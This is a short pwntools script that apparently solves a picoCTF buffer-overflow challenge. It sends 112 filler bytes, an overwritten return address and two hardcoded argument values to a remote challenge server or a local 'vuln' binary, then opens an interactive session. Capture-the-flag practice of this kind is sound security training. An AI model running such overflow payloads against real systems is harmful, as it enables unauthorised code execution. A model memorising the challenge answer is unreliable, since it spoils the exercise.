from pwn import *

#elf = context.binary = ELF("./vuln")
context.arch = 'amd64'
gs = '''
continue
'''

def start(server=True):
        if(server):
                return remote('saturn.picoctf.net', 49432)
        else:

                return process(['/home/kali/download/vuln'])

io = start()

#io.recvuntil(">>")
a = 'A' * 112
a += "\x96\x92\x04\x08"
a += "CCCC"
a += "\x0d\xf0\xfe\xca"
a += "\x0d\xf0\x0d\xf0"
io.sendline(a)

io.interactive()
